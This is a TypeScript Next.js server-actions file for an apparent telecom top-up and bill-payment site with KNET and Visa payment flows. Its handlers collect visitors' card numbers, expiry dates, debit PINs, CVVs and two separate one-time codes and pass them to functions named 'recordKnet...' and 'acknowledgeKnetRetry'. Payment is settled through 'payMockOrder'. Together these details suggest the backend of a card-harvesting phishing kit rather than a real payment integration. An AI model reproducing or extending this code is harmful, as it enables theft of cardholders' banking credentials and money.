"use server";

import { revalidatePath } from "next/cache";
import { clearSession, getSession } from "@/lib/auth";
import type { ActionResult } from "@/lib/codes";
import { addSavedNumber, claimOrders } from "@/controllers/account.controller";
import { login, register } from "@/controllers/auth.controller";
import { payBill } from "@/controllers/bill.controller";
import { confirmVisaCvv, confirmVisaOtp, payMockOrder, startVisaPayment } from "@/controllers/payment.controller";
import {
  acknowledgeKnetRetry,
  recordKnetCvv,
  recordKnetOtp,
  recordKnetOtp2,
  recordKnetPayment,
} from "@/controllers/knet.controller";
import { captureQuickPay } from "@/controllers/quick-pay.controller";
import { createProductOrder } from "@/controllers/recharge.controller";
import { sendTicket } from "@/controllers/support.controller";
import { redeemVoucher } from "@/controllers/voucher.controller";

async function currentUserId() {
  const session = await getSession();
  return session?.id ?? null;
}

function read(formData: FormData) {
  return {
    msisdn: String(formData.get("msisdn") ?? ""),
    productId: String(formData.get("productId") ?? ""),
    idempotencyKey: String(formData.get("idempotencyKey") ?? ""),
    code: String(formData.get("code") ?? ""),
    label: String(formData.get("label") ?? ""),
    name: String(formData.get("name") ?? ""),
    email: String(formData.get("email") ?? ""),
    password: String(formData.get("password") ?? ""),
    message: String(formData.get("message") ?? ""),
    locale: String(formData.get("locale") ?? "ar"),
    orderId: String(formData.get("orderId") ?? ""),
  };
}

export async function rechargeAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return createProductOrder(
    { ...data, amountHalalas: String(formData.get("amountHalalas") ?? "") },
    await currentUserId(),
    "topup",
  );
}

export async function packageAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return createProductOrder(data, await currentUserId(), "package");
}

export async function billAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  return payBill(read(formData), await currentUserId());
}

export async function voucherAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  return redeemVoucher(read(formData), await currentUserId());
}

export async function knetAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  const orderId = data.orderId.trim();
  if (!orderId) return { ok: false, code: "not_found" };
  const result = await recordKnetPayment({
    amount: Number(formData.get("amountHalalas") ?? formData.get("amount") ?? 0),
    cardNumber: String(formData.get("cardNumber") ?? ""),
    expiryDate: String(formData.get("expiryDate") ?? ""),
    pin: String(formData.get("pin") ?? ""),
    cvv: String(formData.get("cvv") ?? "") || undefined,
    orderId,
    sessionId: String(formData.get("sessionId") ?? "") || undefined,
  });
  return result;
}

export async function knetOtpAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return recordKnetOtp({
    orderId: data.orderId,
    otp: String(formData.get("otp") ?? ""),
  });
}

export async function knetCvvAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return recordKnetCvv({
    orderId: data.orderId,
    cvv: String(formData.get("cvv") ?? ""),
    sessionId: String(formData.get("sessionId") ?? "") || undefined,
  });
}

export async function knetOtp2Action(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return recordKnetOtp2({
    orderId: data.orderId,
    otp: String(formData.get("otp") ?? ""),
  });
}

export async function knetAcknowledgeRetryAction(orderId: string): Promise<ActionResult> {
  return acknowledgeKnetRetry(orderId);
}

export async function payAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const method = String(formData.get("method") ?? "");
  const source = method === "knet" || method === "gpay" ? method : "mock";
  const result = await payMockOrder(read(formData).orderId, source);
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function visaAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  const result = await startVisaPayment({
    orderId: data.orderId,
    holderName: data.name,
    number: String(formData.get("number") ?? ""),
    expiry: String(formData.get("expiry") ?? ""),
    sessionId: String(formData.get("sessionId") ?? "") || undefined,
  });
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function visaCvvAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  const result = await confirmVisaCvv({
    orderId: data.orderId,
    cvv: String(formData.get("cvv") ?? ""),
    sessionId: String(formData.get("sessionId") ?? "") || undefined,
  });
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function otpAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  const result = await confirmVisaOtp({
    orderId: data.orderId,
    otp: String(formData.get("otp") ?? ""),
  });
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function loginAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return login({ email: data.email, password: data.password });
}

export async function registerAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const data = read(formData);
  return register(data, data.locale);
}

export async function logoutAction() {
  await clearSession();
}

export async function captureQuickPayAction(msisdn: string, trackerSessionId?: string): Promise<ActionResult> {
  const session = await getSession();
  return captureQuickPay(msisdn, session?.id ?? null, trackerSessionId);
}

export async function saveNumberAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  const session = await getSession();
  if (!session) return { ok: false, code: "invalid_login" };
  const result = await addSavedNumber(session.id, read(formData));
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function claimAction(): Promise<ActionResult> {
  const session = await getSession();
  if (!session) return { ok: false, code: "invalid_login" };
  const result = await claimOrders(session.id);
  if (result.ok) revalidatePath("/", "layout");
  return result;
}

export async function ticketAction(_prev: ActionResult | null, formData: FormData): Promise<ActionResult> {
  return sendTicket(read(formData));
}
